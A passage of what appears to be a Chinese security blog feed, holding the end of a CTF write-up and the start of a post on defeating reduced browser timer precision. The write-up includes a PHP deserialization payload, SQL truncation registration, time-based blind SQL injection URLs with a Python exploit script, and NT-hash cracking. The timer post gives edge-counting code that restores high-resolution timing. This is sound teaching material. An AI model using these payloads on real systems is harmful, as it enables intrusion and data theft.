class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">'./flag.php'</span>;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing=<span class="string">'O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D'</span>; </span><br><span class="line">&#125;   </span><br><span class="line">$a = <span class="keyword">new</span> baby();</span><br><span class="line"><span class="comment">// $a-&gt;bbb =&amp;$a-&gt;aaa;</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>生成payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A10%3A%22.%2Fflag.php%22%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3Bs%3A227%3A%22O%253A4%253A%2522baby%2522%253A3%253A%257Bs%253A9%253A%2522%2500%252A%2500skyobj%2522%253BO%253A4%253A%2522cool%2522%253A3%253A%257Bs%253A8%253A%2522filename%2522%253BN%253Bs%253A4%253A%2522nice%2522%253BN%253Bs%253A6%253A%2522amzing%2522%253BN%253B%257Ds%253A3%253A%2522aaa%2522%253BN%253Bs%253A3%253A%2522bbb%2522%253BR%253A6%253B%257D%22%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BN%3B%7D</span><br></pre></td></tr></table></figure></p><p>最后可以得到<br><img src="/images/2019-01-25-19-59-00.gif" alt=""><br>即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bd75a38e62ec0e450745a8eb8e667f5b</span><br></pre></td></tr></table></figure></p><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple php"></a>simple php</h2><p>拿到题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10004/index.php</span><br></pre></td></tr></table></figure></p><p>探测了一番，发现<code>robots.txt</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line"></span><br><span class="line">Disallow: /ebooks</span><br><span class="line">Disallow: /admin</span><br><span class="line">Disallow: /xhtml/?</span><br><span class="line">Disallow: /center</span><br></pre></td></tr></table></figure></p><p>尝试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10004/admin</span><br></pre></td></tr></table></figure></p><p>发现有登录和注册页面<br><img src="/images/2019-01-26-17-46-09.png" alt=""><br>探测后，发现是sql约束攻击<br>注册<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = admin                                                                                1</span><br><span class="line">password = 12345678</span><br></pre></td></tr></table></figure></p><p>登录即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10004/Admin/User/Index</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-01-26-17-47-15.png" alt=""><br>发现是搜索框，并且是tp3.2<br>不难想到注入漏洞，随手尝试报错id<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and polygon(id)--</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-01-26-17-51-56.png" alt=""><br>发现库名<code>tpctf</code>，表名<code>flag</code>，根据经验猜测字段名是否为flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and polygon(flag)--</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-01-26-17-52-53.png" alt=""><br>nice，发现flag字段也存在，省了不少事<br>下面是思考如何注入得到数据,随手测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and if(1,sleep(3),0)--</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-01-26-17-58-05.png" alt=""><br>发现成功sleep 3s,轻松写出exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">cookies = &#123;</span><br><span class="line"><span class="string">'PHPSESSID'</span>: <span class="string">'re4g49sil8hfh4ovfrk7ln1o02'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'0123456789abcdef'</span>:</span><br><span class="line">url = <span class="string">'http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and if((ascii(substr((select flag from flag limit 0,1),'</span>+str(i)+<span class="string">',1))='</span>+str(ord(j))+<span class="string">'),sleep(3),0)--'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = requests.get(url=url,timeout=<span class="number">2.5</span>,cookies=cookies)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">flag += j</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>但是有点恶心的是，好像每隔5分钟就要重新注册，登录一遍，断断续续跑了几次，得到flag<br><img src="/images/2019-01-26-18-05-50.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">459a1b6ea697453c60132386a5f572d6</span><br></pre></td></tr></table></figure></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Get-it"><a href="#Get-it" class="headerlink" title="Get it"></a>Get it</h3><p>题目描述<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Alice和Bob正在进行通信，作为中间人的Eve一直在窃听他们两人的通信。</span><br><span class="line"></span><br><span class="line">Eve窃听到这样一段内容，主要内容如下：</span><br><span class="line">p = 37</span><br><span class="line">A = 17</span><br><span class="line">B = 31</span><br><span class="line"></span><br><span class="line">U2FsdGVkX1+mrbv3nUfzAjMY1kzM5P7ok/TzFCTFGs7ivutKLBLGbZxOfFebNdb2</span><br><span class="line">l7V38e7I2ywU+BW/2dOTWIWnubAzhMN+jzlqbX6dD1rmGEd21sEAp40IQXmN/Y0O</span><br><span class="line">K4nCu4xEuJsNsTJZhk50NaPTDk7J7J+wBsScdV0fIfe23pRg58qzdVljCOzosb62</span><br><span class="line">7oPwxidBEPuxs4WYehm+15zjw2cw03qeOyaXnH/yeqytKUxKqe2L5fytlr6FybZw</span><br><span class="line">HkYlPZ7JarNOIhO2OP3n53OZ1zFhwzTvjf7MVPsTAnZYc+OF2tqJS5mgWkWXnPal</span><br><span class="line">+A2lWQgmVxCsjl1DLkQiWy+bFY3W/X59QZ1GEQFY1xqUFA4xCPkUgB+G6AC8DTpK</span><br><span class="line">ix5+Grt91ie09Ye/SgBliKdt5BdPZplp0oJWdS8Iy0bqfF7voKX3VgTwRaCENgXl</span><br><span class="line">VwhPEOslBJRh6Pk0cA0kUzyOQ+xFh82YTrNBX6xtucMhfoenc2XDCLp+qGVW9Kj6</span><br><span class="line">m5lSYiFFd0E=</span><br><span class="line"></span><br><span class="line">分析得知，他们是在公共信道上交换加密密钥，共同建立共享密钥。</span><br><span class="line"></span><br><span class="line">而上面这段密文是Alice和Bob使用自己的密值和共享秘钥，组成一串字符的md5值的前16位字符作为密码使用另外一种加密算法加密明文得到的。</span><br><span class="line"></span><br><span class="line">例如Alice的密值为3，Bob的密值为6，共享秘钥为35，那么密码为：</span><br><span class="line"></span><br><span class="line">password = hashlib.md5(&quot;(3,6,35)&quot;).hexdigest()[0:16]</span><br></pre></td></tr></table></figure></p><p>看到密钥交换和给定的3个参数，不难想到是Diffie-Hellman密钥交换算法<br>那么我们现在知道<br>1.A的公钥为17<br>2.B的公钥为31<br>3.素数p为37<br>那么第一步是先求g<br>我们知道g是p的一个模p本原单位根(primitive root module p)，所谓本原单位根就是指在模p乘法运算下，g的1次方，2次方……(p-1)次方这p-1个数互不相同，并且取遍1到p-1；<br>我们直接调用sagemath的函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print primitive_root(37)</span><br></pre></td></tr></table></figure></p><p>可以得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g=2</span><br></pre></td></tr></table></figure></p><p>然后我们知道<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A = g^a mod p</span><br><span class="line">B = g^b mod p</span><br></pre></td></tr></table></figure></p><p>即已知A,B,g,p怎么求a和b<br>因为这里的数都比较小，我们使用在线网站<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.alpertron.com.ar/DILOG.HTM</span><br></pre></td></tr></table></figure></p><p>对于A的私钥，我们得到<br><img src="/images/2019-01-25-14-59-59.png" alt=""><br>对于B的私钥，我们得到<br><img src="/images/2019-01-25-15-00-17.png" alt=""><br>而对于共享密钥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key =  g^(b*a) mod p</span><br></pre></td></tr></table></figure></p><p>计算<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">7</span></span><br><span class="line">b = <span class="number">9</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line">p = <span class="number">37</span></span><br><span class="line"><span class="keyword">print</span> pow(g,a*b,p)</span><br></pre></td></tr></table></figure></p><p>得到共享密钥为6<br>于是按照样例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">例如Alice的密值为3，Bob的密值为6，共享秘钥为35，那么密码为：</span><br><span class="line"></span><br><span class="line">password = hashlib.md5(&quot;(3,6,35)&quot;).hexdigest()[0:16]</span><br></pre></td></tr></table></figure></p><p>我们得到password<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">password = hashlib.md5(<span class="string">"(7,9,6)"</span>).hexdigest()[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line"><span class="keyword">print</span> password</span><br></pre></td></tr></table></figure></p><p>结果<code>a7ece9d133c9ec03</code><br>而对于密文<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1+mrbv3nUfzAjMY1kzM5P7ok/TzFCTFGs7ivutKLBLGbZxOfFebNdb2</span><br><span class="line">l7V38e7I2ywU+BW/2dOTWIWnubAzhMN+jzlqbX6dD1rmGEd21sEAp40IQXmN/Y0O</span><br><span class="line">K4nCu4xEuJsNsTJZhk50NaPTDk7J7J+wBsScdV0fIfe23pRg58qzdVljCOzosb62</span><br><span class="line">7oPwxidBEPuxs4WYehm+15zjw2cw03qeOyaXnH/yeqytKUxKqe2L5fytlr6FybZw</span><br><span class="line">HkYlPZ7JarNOIhO2OP3n53OZ1zFhwzTvjf7MVPsTAnZYc+OF2tqJS5mgWkWXnPal</span><br><span class="line">+A2lWQgmVxCsjl1DLkQiWy+bFY3W/X59QZ1GEQFY1xqUFA4xCPkUgB+G6AC8DTpK</span><br><span class="line">ix5+Grt91ie09Ye/SgBliKdt5BdPZplp0oJWdS8Iy0bqfF7voKX3VgTwRaCENgXl</span><br><span class="line">VwhPEOslBJRh6Pk0cA0kUzyOQ+xFh82YTrNBX6xtucMhfoenc2XDCLp+qGVW9Kj6</span><br><span class="line">m5lSYiFFd0E=</span><br></pre></td></tr></table></figure></p><p>看到<code>U2F</code>这样的开头，我们尝试解密RC4,AES,DES<br>最后发现DES成功解密<br><img src="/images/2019-01-25-15-16-02.png" alt=""><br>成功得到flag：<code>flag{8598544ba1a5713b1de04d3f0c41eb71}</code></p><h3 id="键盘之争"><a href="#键盘之争" class="headerlink" title="键盘之争"></a>键盘之争</h3><p>看到题目名称键盘之争<br>以及唯一的信息<code>ypau_kjg;&quot;g;&quot;ypau+</code><br>先去百度了下<br><img src="/images/2019-01-25-15-46-48.png" alt=""><br>发现第一项就是键盘之争，看来是有一个键位布局的映射关系<br>于是按照图片<br><img src="/images/2019-01-25-15-47-20.png" alt=""><br><img src="/images/2019-01-25-15-47-26.png" alt=""><br>简单写了个映射代码<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">QWERTY = [<span class="string">'q'</span>,<span class="string">'w'</span>,<span class="string">'e'</span>,<span class="string">'r'</span>,<span class="string">'t'</span>,<span class="string">'y'</span>,<span class="string">'u'</span>,<span class="string">'i'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>,<span class="string">'|'</span>,<span class="string">'a'</span>,<span class="string">'s'</span>,<span class="string">'d'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">';'</span>,<span class="string">'"'</span>,<span class="string">'z'</span>,<span class="string">'x'</span>,<span class="string">'c'</span>,<span class="string">'v'</span>,<span class="string">'b'</span>,<span class="string">'n'</span>,<span class="string">'m'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>,<span class="string">'?'</span>,<span class="string">'_'</span>,<span class="string">'+'</span>]</span><br><span class="line">Dvorak = [<span class="string">'"'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>,<span class="string">'p'</span>,<span class="string">'y'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'c'</span>,<span class="string">'r'</span>,<span class="string">'l'</span>,<span class="string">'?'</span>,<span class="string">'+'</span>,<span class="string">'|'</span>,<span class="string">'a'</span>,<span class="string">'o'</span>,<span class="string">'e'</span>,<span class="string">'u'</span>,<span class="string">'i'</span>,<span class="string">'d'</span>,<span class="string">'h'</span>,<span class="string">'t'</span>,<span class="string">'n'</span>,<span class="string">'s'</span>,<span class="string">'_'</span>,<span class="string">';'</span>,<span class="string">'q'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'x'</span>,<span class="string">'b'</span>,<span class="string">'m'</span>,<span class="string">'w'</span>,<span class="string">'v'</span>,<span class="string">'z'</span>,<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>]</span><br><span class="line">dic = zip(Dvorak,QWERTY)</span><br><span class="line"></span><br><span class="line">c = <span class="string">'ypau_kjg;"g;"ypau+'</span></span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line"><span class="keyword">for</span> key,value <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">if</span> key == i:</span><br><span class="line">res += value</span><br><span class="line"><span class="keyword">print</span> res</span><br></pre></td></tr></table></figure></p><p>得到结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">traf&quot;vcuzquzqtraf&#125;</span><br></pre></td></tr></table></figure></p><p>看到有双引号感觉怪怪的，于是尝试<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dic = zip(QWERTY,Dvorak)</span><br></pre></td></tr></table></figure></p><p>于是得到结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;this_is_flag&#125;</span><br></pre></td></tr></table></figure></p><p>这就美滋滋了，md5后得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">951c712ac2c3e57053c43d80c0a9e543</span><br></pre></td></tr></table></figure></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="memory"><a href="#memory" class="headerlink" title="memory"></a>memory</h3><p>拿到题目，既然要拿管理员密码，我们先查看下profile类型<br><img src="/images/2019-01-25-19-46-31.png" alt=""><br>得到类型为<code>WinXPSP2x86</code><br>紧接着查注册表位置，找到system和sam key的起始位置<br><img src="/images/2019-01-25-19-46-48.png" alt=""><br>然后将其值导出<br><img src="/images/2019-01-25-19-46-58.png" alt=""><br>得到<br><img src="/images/2019-01-25-19-47-07.png" alt=""><br>获得Administrator的<code>NThash:c22b315c040ae6e0efee3518d830362b</code><br>拿去破解<br><img src="/images/2019-01-25-19-47-41.png" alt=""><br>得到密码123456789<br>MD5后提交<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">25f9e794323b453885f5181f1b624d0b</span><br></pre></td></tr></table></figure></p><h3 id="赢战2019"><a href="#赢战2019" class="headerlink" title="赢战2019"></a>赢战2019</h3><p>拿到图片先binwalk一下<br><img src="/images/2019-01-25-21-11-52.png" alt=""><br>尝试提取里面的图片<br><img src="/images/2019-01-25-21-12-00.png" alt=""><br>得到提取后的图片<br><img src="/images/2019-01-25-21-12-09.png" alt=""><br>扫描一下<br><img src="/images/2019-01-25-21-16-09.png" alt=""><br>发现还有，于是用stegsolve打开<br><img src="/images/2019-01-25-21-15-58.png" alt=""><br>发现flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;You_ARE_SOsmart&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cla
      
    
    </summary>
    
      <category term="writeup" scheme="http://skysec.top/categories/writeup/"/>
    
    
      <category term="writeup" scheme="http://skysec.top/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript侧信道时间测量</title>
    <link href="http://skysec.top/2019/01/22/JavaScript%E4%BE%A7%E4%BF%A1%E9%81%93%E6%97%B6%E9%97%B4%E6%B5%8B%E9%87%8F/"/>
    <id>http://skysec.top/2019/01/22/JavaScript侧信道时间测量/</id>
    <published>2019-01-22T12:23:22.000Z</published>
    <updated>2019-01-27T13:46:10.125Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于安全客 https://www.anquanke.com/post/id/170268</span><br></pre></td></tr></table></figure><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近因为需求，需要测量JavaScript单个函数的执行时间，但由于精度问题，遇到了各种各样的问题，在此做简单记录。</p><h2 id="JavaScript高精度时间函数"><a href="#JavaScript高精度时间函数" class="headerlink" title="JavaScript高精度时间函数"></a>JavaScript高精度时间函数</h2><p>首先得明确，JavaScript单个函数执行时间应该是微秒级的，所以必须需要高精度。那么第一反应自然是查找是否有相关函数，以往的时间函数<code>new Date().getTime()</code>肯定是不够了，因为其精度为毫秒级，测量函数执行时间，得到的结果必然为0。<br>这里我们查阅手册，将目光定位到<code>performance.now()</code><br>我们不妨做个测试<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> n = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (n&lt;<span class="number">10000</span>)&#123;</span><br><span class="line">  <span class="built_in">console</span>.log((<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime());</span><br><span class="line">  n = n+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>得到结果<br><img src="/images/2019-01-24-21-03-32.png" alt=""><br>而对于<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> n = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (n&lt;<span class="number">10000</span>)&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(performance.now());</span><br><span class="line">  n = n+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>得到结果<br><img src="/images/2019-01-24-21-04-15.png" alt=""><br>我们可以轻易的看出，这里进行一次循环大概是0.04ms，而精度在ms级的<code>new Date().getTime()</code>已经无能为力</p><h2 id="精度失灵"><a href="#精度失灵" class="headerlink" title="精度失灵"></a>精度失灵</h2><p>既然确定了<code>performance.now()</code>，不妨在Chrome进行测试<br><img src="/images/2019-01-24-21-11-27.png" alt=""><br>我们可以轻松测量出<code>crypto.getRandomValues(new Uint8Array(10))</code>的运行时间大概为0.1ms<br>但由于可能存在误差，我尝试运行1000次，却出现了问题<br><img src="/images/2019-01-24-21-12-38.png" alt=""><br>竟然出现了大量的0<br>我又在我虚拟机里的Chrome运行<br><img src="/images/2019-01-24-21-15-37.png" alt=""><br>这是什么原因？对比之后发现<br>虚拟机<br><img src="/images/2019-01-24-14-53-45.png" alt=""><br>而物理机<br><img src="/images/2019-01-24-14-54-54.png" alt=""><br>查阅Chrome的Updates (2018)<br>由于高精度的时间可应用于重大漏洞speculative execution side-channel attack(<code>https://spectreattack.com/</code>)<br>所以各大主流浏览器做出了安全措施<br>例如FireFox、Safari，将<code>performance.now()</code>精度降低为1ms<br><img src="/images/2019-01-24-21-25-56.png" alt=""><br><img src="/images/2019-01-24-21-36-14.png" alt=""><br>而Chrome改为100微秒并加入了抖动<br><img src="/images/2019-01-24-21-35-16.png" alt=""><br>所以这也不难解释，为什么Chrome 71版本得到这么多0，相比FireFox、Safari，能得到数据，已经算是仁慈了</p><h2 id="柳暗花明"><a href="#柳暗花明" class="headerlink" title="柳暗花明"></a>柳暗花明</h2><p>那么怎么进行高精度测量呢？不能因为浏览器的不支持，我们就不完成需求吧~<br>这里查阅文章发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://link.springer.com/chapter/10.1007/978-3-319-70972-7_13</span><br></pre></td></tr></table></figure></p><p>一文中进行了JavaScript侧信道测量时间的介绍<br>由于精度问题，例如<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> start = performance.now();</span><br><span class="line">func()</span><br><span class="line"><span class="keyword">var</span> end = performance.now();</span><br></pre></td></tr></table></figure></p><p>会使得<code>start = end</code>,这样测量出来只能为0，而作者很巧妙的使用了<code>wait_edge()</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wait_edge</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> next,last = performance.now();</span><br><span class="line">    <span class="keyword">while</span>((next = performance.now()) == last)</span><br><span class="line">    &#123;&#125;</span><br><span class="line">    <span class="keyword">return</span> next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这样一来就可以到下一次performance.now()的时候再继续<br>那么问题又来了，中间空转的时间怎么办呢？<br>作者又使用了<code>count_edge()</code>进行了空转次数探测<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">count_edge</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> last = performance.now(),count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(performance.now() == last) count++;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>那么怎么把空转次数的单次时间测量出来呢？这里作者又设计了<code>calibrate()</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">calibrate</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> counter = <span class="number">0</span>,next;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        next = wait_edge();</span><br><span class="line">        counter += count_edge();</span><br><span class="line">    &#125;</span><br><span class="line">    next = wait_edge();</span><br><span class="line">    <span class="keyword">return</span> (wait_edge() - next)/(counter/<span class="number">10.0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>假设我们要测量函数fuc()，即可如下编写即可<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">measure</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> start = wait_edge();</span><br><span class="line">    fuc();</span><br><span class="line">    <span class="keyword">var</span> count = count_edge();</span><br><span class="line">    <span class="keyword">return</span> (performance.now()-start)-count*calibrate();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>即结束减去开始的时间，再减去中间空转的时间。<br>我们再来用chrome 71测试一下<br><img src="/images/2019-01-24-21-49-43.png" alt=""><br>和之前的<code>performance.now()</code>对比<br><img src="/images/2019-01-24-21-12-38.png" alt=""><br>显然误差已经控制在了0.01ms，即10微秒内，这是我们能接受的<br>当然，在FireFox这种ms级的更有成就感，因为之前的结果都是0，但是用这样的方法，可以测量了<br>FireFox:<br><img src="/images/2019-01-24-21-52-57.png" 